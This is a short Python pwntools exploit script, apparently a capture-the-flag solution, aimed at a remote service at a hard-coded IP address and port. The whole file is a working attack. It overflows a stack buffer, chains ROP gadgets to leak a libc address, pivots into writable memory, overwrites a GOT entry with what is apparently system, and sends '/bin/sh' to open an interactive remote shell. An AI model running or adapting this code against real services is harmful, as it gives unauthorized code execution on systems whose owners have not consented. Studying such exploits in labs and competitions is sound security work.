from pwn import *

gadget1 = 0x08048538 # pop ebx ; pop esi ; pop edi ; pop ebp ; ret
#s = remote('192.168.32.236',1234)
s = remote('121.170.91.17', 1337)
raw_input()
dat = "A"*0x28
dat += 'AAAA'
dat += p32(0x8048360)
dat += p32(0x0804849B)
dat += p32(0x0804A00c)
print len(dat)
s.recvuntil(':')
s.send(dat)
libc = u32(s.recvuntil('\xf7')[-4:]) - 0xd4350 #- 0xd5af0
log.info("LIBC : 0x%x"%libc)
s.recvuntil(':')
dat = "A"*0x28
dat += p32(0x0804Ac00-0x4)
dat += p32(0x08048350)
dat += p32(0x080484D7)
dat += p32(0x0)
dat += p32(0x0804Ac00)
dat += p32(0x100)
s.send(dat)

dat = p32(0x08048350)
dat += p32(gadget1+1)
dat += p32(0)
dat += p32(0x804A200)
dat += p32(0x10)

dat += p32(0x08048350)
dat += p32(gadget1+1)
dat += p32(0)
dat += p32(0x804A010)
dat += p32(0x10)
dat += p32(0x8048360)
dat += p32(0)
dat += p32(0x804A200)
raw_input()
s.send(dat)
time.sleep(0.3)
s.send('/bin/sh\x00')
time.sleep(0.3)
s.send(p32(libc+0x3a940))
s.interactive()
